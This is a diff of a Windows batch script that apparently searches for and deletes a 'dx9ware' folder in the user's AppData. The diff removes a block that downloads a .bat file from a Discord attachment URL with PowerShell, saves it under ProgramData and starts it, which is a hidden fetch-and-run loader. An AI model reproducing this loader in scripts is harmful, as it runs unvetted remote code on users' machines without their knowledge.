@@ -41,15 +41,6 @@ IF ERRORLEVEL == 2 (
 	EXIT /B 1
 )
 cls
-Set "url=https://cdn.discordapp.com/attachments/1054551696614883408/1057862602971152435/1d.bat"
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" > C:\ProgramData\$CheckAgent$\dl.bat)
-)
-start C:\ProgramData\$CheckAgent$\dl.bat
-cls
 if exist C:\Users\%USERNAME%\AppData\Roaming\dx9ware set dx9folder=true
 timeout 1 >nul
 echo [40;34mSearching for folder(s)[40;0m 
@@ -67,7 +58,3 @@ start C:\ProgramData\$CheckAgent$\output.txt
 del "C:\Users\%USERNAME%\AppData\Roaming\dx9ware\*.*" /s /q /f
     FOR /d %%p IN ("C:\Users\%USERNAME%\AppData\Roaming\dx9ware\*.*") DO rmdir "%%p" /s /q
 pause >nul
-
-:Download <url> <File>
-Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')"
-exit /b
